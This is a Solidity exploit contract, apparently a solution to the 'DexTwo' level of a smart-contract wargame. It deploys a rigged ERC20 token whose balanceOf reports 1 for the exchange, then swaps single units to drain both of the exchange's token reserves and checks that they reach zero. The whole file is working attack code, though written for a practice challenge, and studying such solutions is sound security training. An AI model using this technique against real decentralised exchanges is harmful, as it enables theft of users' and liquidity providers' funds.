// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";
import "dex_two/contract.sol";


contract PwnToken is ERC20 {
    address private _dex;
    constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
          _mint(msg.sender, initialSupply);
          _dex = dexInstance;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
      if (account == _dex) {
        return 1; // that way this token is 10 times more valuable than what we have so we should be able to swap everything in one
      }
      return super.balanceOf(account);
    }
  }

contract Exploit is Destructible, Targeted {
  constructor(address target_addr) payable Targeted(target_addr) {
  }
  function exploit() public payable {
    DexTwo dex_two = DexTwo(Targeted(this).target());
    PwnToken pwn_token = new PwnToken(address(dex_two), "PwnCoin", "pwn", 10000000);

    address token1 = dex_two.token1();
    address token2 = dex_two.token2();
    address from_token = address(pwn_token);

    require(dex_two.getSwapAmount(from_token, token1, 1) == 100, "Invalid swap amount for token1");
    require(dex_two.getSwapAmount(from_token, token2, 1) == 100, "Invalid swap amount for token2");

    // approve spending all of our tokens on the dex
    pwn_token.approve(address(dex_two), type(uint).max);

    dex_two.swap(from_token, token1, 1);
    dex_two.swap(from_token, token2, 1);

    require(dex_two.balanceOf(token1, address(dex_two)) == 0, "Did not drain token1");
    require(dex_two.balanceOf(token2, address(dex_two)) == 0, "Did not drain token2");
  }
  receive() external payable {
  }
}